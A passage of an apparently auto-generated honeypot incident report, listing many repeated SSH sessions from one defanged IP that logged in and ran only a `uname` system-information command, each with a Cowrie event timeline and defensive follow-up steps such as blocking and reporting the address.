- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947457eabbdd

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:31` | `cowrie.session.connect` |
| `2026-07-06 09:25:32` | `cowrie.client.version` |
| `2026-07-06 09:25:32` | `cowrie.client.kex` |
| `2026-07-06 09:25:32` | `cowrie.login.success` |
| `2026-07-06 09:25:33` | `cowrie.session.params` |
| `2026-07-06 09:25:33` | `cowrie.command.input` |
| `2026-07-06 09:25:35` | `cowrie.log.closed` |
| `2026-07-06 09:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc360763fe93

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:32` | `cowrie.session.connect` |
| `2026-07-06 09:25:39` | `cowrie.client.version` |
| `2026-07-06 09:25:39` | `cowrie.client.kex` |
| `2026-07-06 09:25:45` | `cowrie.login.success` |
| `2026-07-06 09:25:48` | `cowrie.session.params` |
| `2026-07-06 09:25:48` | `cowrie.command.input` |
| `2026-07-06 09:25:48` | `cowrie.log.closed` |
| `2026-07-06 09:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c4153f0537a

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:32` | `cowrie.session.connect` |
| `2026-07-06 09:25:32` | `cowrie.client.version` |
| `2026-07-06 09:25:32` | `cowrie.client.kex` |
| `2026-07-06 09:25:32` | `cowrie.login.success` |
| `2026-07-06 09:25:34` | `cowrie.session.params` |
| `2026-07-06 09:25:34` | `cowrie.command.input` |
| `2026-07-06 09:25:35` | `cowrie.log.closed` |
| `2026-07-06 09:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7caea0f43e8

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:33` | `cowrie.session.connect` |
| `2026-07-06 09:25:33` | `cowrie.client.version` |
| `2026-07-06 09:25:33` | `cowrie.client.kex` |
| `2026-07-06 09:25:35` | `cowrie.login.success` |
| `2026-07-06 09:25:36` | `cowrie.session.params` |
| `2026-07-06 09:25:36` | `cowrie.command.input` |
| `2026-07-06 09:25:36` | `cowrie.log.closed` |
| `2026-07-06 09:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6ac2c0d55f

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:35` | `cowrie.session.connect` |
| `2026-07-06 09:25:36` | `cowrie.client.version` |
| `2026-07-06 09:25:36` | `cowrie.client.kex` |
| `2026-07-06 09:25:37` | `cowrie.login.success` |
| `2026-07-06 09:25:38` | `cowrie.session.params` |
| `2026-07-06 09:25:38` | `cowrie.command.input` |
| `2026-07-06 09:25:42` | `cowrie.log.closed` |
| `2026-07-06 09:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247c3f415839

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:36` | `cowrie.session.connect` |
| `2026-07-06 09:25:36` | `cowrie.client.version` |
| `2026-07-06 09:25:36` | `cowrie.client.kex` |
| `2026-07-06 09:25:37` | `cowrie.login.success` |
| `2026-07-06 09:25:40` | `cowrie.session.params` |
| `2026-07-06 09:25:40` | `cowrie.command.input` |
| `2026-07-06 09:25:41` | `cowrie.log.closed` |
| `2026-07-06 09:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e1c15e13b5

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:38` | `cowrie.session.connect` |
| `2026-07-06 09:25:38` | `cowrie.client.version` |
| `2026-07-06 09:25:42` | `cowrie.client.kex` |
| `2026-07-06 09:25:44` | `cowrie.login.success` |
| `2026-07-06 09:25:46` | `cowrie.session.params` |
| `2026-07-06 09:25:46` | `cowrie.command.input` |
| `2026-07-06 09:25:48` | `cowrie.log.closed` |
| `2026-07-06 09:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8e6c4acddf

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:38` | `cowrie.session.connect` |
| `2026-07-06 09:25:38` | `cowrie.client.version` |
| `2026-07-06 09:25:39` | `cowrie.client.kex` |
| `2026-07-06 09:25:43` | `cowrie.login.success` |
| `2026-07-06 09:25:45` | `cowrie.session.params` |
| `2026-07-06 09:25:45` | `cowrie.command.input` |
| `2026-07-06 09:25:47` | `cowrie.log.closed` |
| `2026-07-06 09:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c2b17a363d

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:38` | `cowrie.session.connect` |
| `2026-07-06 09:25:39` | `cowrie.client.version` |
| `2026-07-06 09:25:40` | `cowrie.client.kex` |
| `2026-07-06 09:25:44` | `cowrie.login.success` |
| `2026-07-06 09:25:45` | `cowrie.session.params` |
| `2026-07-06 09:25:45` | `cowrie.command.input` |
| `2026-07-06 09:25:47` | `cowrie.log.closed` |
| `2026-07-06 09:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1593dece40a

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:40` | `cowrie.session.connect` |
| `2026-07-06 09:25:40` | `cowrie.client.version` |
| `2026-07-06 09:25:41` | `cowrie.client.kex` |
| `2026-07-06 09:25:44` | `cowrie.login.success` |
| `2026-07-06 09:25:47` | `cowrie.session.params` |
| `2026-07-06 09:25:47` | `cowrie.command.input` |
| `2026-07-06 09:25:48` | `cowrie.log.closed` |
| `2026-07-06 09:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db862b8c507b

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:41` | `cowrie.session.connect` |
| `2026-07-06 09:25:42` | `cowrie.client.version` |
| `2026-07-06 09:25:42` | `cowrie.client.kex` |
| `2026-07-06 09:25:45` | `cowrie.login.success` |
| `2026-07-06 09:25:48` | `cowrie.session.params` |
| `2026-07-06 09:25:48` | `cowrie.command.input` |
| `2026-07-06 09:26:01` | `cowrie.log.closed` |
| `2026-07-06 09:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6368662d8551

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:43` | `cowrie.session.connect` |
| `2026-07-06 09:25:43` | `cowrie.client.version` |
| `2026-07-06 09:25:43` | `cowrie.client.kex` |
| `2026-07-06 09:25:48` | `cowrie.login.success` |
| `2026-07-06 09:25:50` | `cowrie.session.params` |
| `2026-07-06 09:25:50` | `cowrie.command.input` |
| `2026-07-06 09:25:50` | `cowrie.log.closed` |
| `2026-07-06 09:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0143c9131438

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:44` | `cowrie.session.connect` |
| `2026-07-06 09:25:45` | `cowrie.client.version` |
| `2026-07-06 09:25:45` | `cowrie.client.kex` |
| `2026-07-06 09:25:55` | `cowrie.login.success` |
| `2026-07-06 09:26:02` | `cowrie.session.params` |
| `2026-07-06 09:26:02` | `cowrie.command.input` |
| `2026-07-06 09:26:02` | `cowrie.log.closed` |
| `2026-07-06 09:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda72e7c3a25

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:47` | `cowrie.session.connect` |
| `2026-07-06 09:25:47` | `cowrie.client.version` |
| `2026-07-06 09:25:48` | `cowrie.client.kex` |
| `2026-07-06 09:25:50` | `cowrie.login.success` |
| `2026-07-06 09:25:51` | `cowrie.session.params` |
| `2026-07-06 09:25:51` | `cowrie.command.input` |
| `2026-07-06 09:25:51` | `cowrie.log.closed` |
| `2026-07-06 09:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7783f851693

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:49` | `cowrie.session.connect` |
| `2026-07-06 09:25:49` | `cowrie.client.version` |
| `2026-07-06 09:25:50` | `cowrie.client.kex` |
| `2026-07-06 09:25:51` | `cowrie.login.success` |
| `2026-07-06 09:25:52` | `cowrie.session.params` |
| `2026-07-06 09:25:52` | `cowrie.command.input` |
| `2026-07-06 09:25:52` | `cowrie.log.closed` |
| `2026-07-06 09:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5078347830

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:30 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:51` | `cowrie.session.connect` |
| `2026-07-06 09:25:52` | `cowrie.client.version` |
| `2026-07-06 09:25:52` | `cowrie.client.kex` |
| `2026-07-06 09:25:53` | `cowrie.login.success` |
| `2026-07-06 09:25:54` | `cowrie.session.params` |
| `2026-07-06 09:25:54` | `cowrie.command.input` |
| `2026-07-06 09:25:55` | `cowrie.log.closed` |
| `2026-07-06 09:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c088cfbd3cc

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:25 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:25:52` | `cowrie.session.connect` |
| `2026-07-06 09:25:52` | `cowrie.client.version` |
| `2026-07-06 09:25:52` | `cowrie.client.kex` |
| `2026-07-06 09:25:53` | `cowrie.login.success` |
| `2026-07-06 09:25:55` | `cowrie.session.params` |
| `2026-07-06 09:25:55` | `cowrie.command.input` |
| `2026-07-06 09:25:55` | `cowrie.log.closed` |
| `2026-07-06 09:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1792d38dc3

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:01` | `cowrie.session.connect` |
| `2026-07-06 09:26:01` | `cowrie.client.version` |
| `2026-07-06 09:26:02` | `cowrie.client.kex` |
| `2026-07-06 09:26:03` | `cowrie.login.success` |
| `2026-07-06 09:26:05` | `cowrie.session.params` |
| `2026-07-06 09:26:05` | `cowrie.command.input` |
| `2026-07-06 09:26:06` | `cowrie.log.closed` |
| `2026-07-06 09:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435e452d3a81

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:01` | `cowrie.session.connect` |
| `2026-07-06 09:26:01` | `cowrie.client.version` |
| `2026-07-06 09:26:02` | `cowrie.client.kex` |
| `2026-07-06 09:26:03` | `cowrie.login.success` |
| `2026-07-06 09:26:04` | `cowrie.session.params` |
| `2026-07-06 09:26:04` | `cowrie.command.input` |
| `2026-07-06 09:26:05` | `cowrie.log.closed` |
| `2026-07-06 09:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b56f90a063

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:02` | `cowrie.session.connect` |
| `2026-07-06 09:26:02` | `cowrie.client.version` |
| `2026-07-06 09:26:02` | `cowrie.client.kex` |
| `2026-07-06 09:26:03` | `cowrie.login.success` |
| `2026-07-06 09:26:06` | `cowrie.session.params` |
| `2026-07-06 09:26:06` | `cowrie.command.input` |
| `2026-07-06 09:26:07` | `cowrie.log.closed` |
| `2026-07-06 09:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da0aab1c741

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:03` | `cowrie.session.connect` |
| `2026-07-06 09:26:03` | `cowrie.client.version` |
| `2026-07-06 09:26:05` | `cowrie.client.kex` |
| `2026-07-06 09:26:07` | `cowrie.login.success` |
| `2026-07-06 09:26:30` | `cowrie.session.params` |
| `2026-07-06 09:26:30` | `cowrie.command.input` |
| `2026-07-06 09:26:30` | `cowrie.log.closed` |
| `2026-07-06 09:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20b9c9fa2cf7

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:05` | `cowrie.session.connect` |
| `2026-07-06 09:26:05` | `cowrie.client.version` |
| `2026-07-06 09:26:06` | `cowrie.client.kex` |
| `2026-07-06 09:26:30` | `cowrie.login.success` |
| `2026-07-06 09:26:57` | `cowrie.session.params` |
| `2026-07-06 09:26:57` | `cowrie.command.input` |
| `2026-07-06 09:26:57` | `cowrie.log.closed` |
| `2026-07-06 09:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837a404c7e65

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:05` | `cowrie.session.connect` |
| `2026-07-06 09:26:05` | `cowrie.client.version` |
| `2026-07-06 09:26:06` | `cowrie.client.kex` |
| `2026-07-06 09:26:29` | `cowrie.login.success` |
| `2026-07-06 09:26:31` | `cowrie.session.params` |
| `2026-07-06 09:26:31` | `cowrie.command.input` |
| `2026-07-06 09:26:37` | `cowrie.log.closed` |
| `2026-07-06 09:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c48cdcb32c

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:31 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:06` | `cowrie.session.connect` |
| `2026-07-06 09:26:06` | `cowrie.client.version` |
| `2026-07-06 09:26:07` | `cowrie.client.kex` |
| `2026-07-06 09:26:07` | `cowrie.login.success` |
| `2026-07-06 09:26:08` | `cowrie.session.params` |
| `2026-07-06 09:26:08` | `cowrie.command.input` |
| `2026-07-06 09:26:09` | `cowrie.log.closed` |
| `2026-07-06 09:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e07e4c39fe04

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:31 |
| **Session Duration** | 324s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:06` | `cowrie.session.connect` |
| `2026-07-06 09:26:07` | `cowrie.client.version` |
| `2026-07-06 09:26:07` | `cowrie.client.kex` |
| `2026-07-06 09:26:31` | `cowrie.login.success` |
| `2026-07-06 09:27:01` | `cowrie.session.params` |
| `2026-07-06 09:27:01` | `cowrie.command.input` |
| `2026-07-06 09:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56d6ae45053

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:31 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:07` | `cowrie.session.connect` |
| `2026-07-06 09:26:07` | `cowrie.client.version` |
| `2026-07-06 09:26:07` | `cowrie.client.kex` |
| `2026-07-06 09:26:09` | `cowrie.login.success` |
| `2026-07-06 09:26:10` | `cowrie.session.params` |
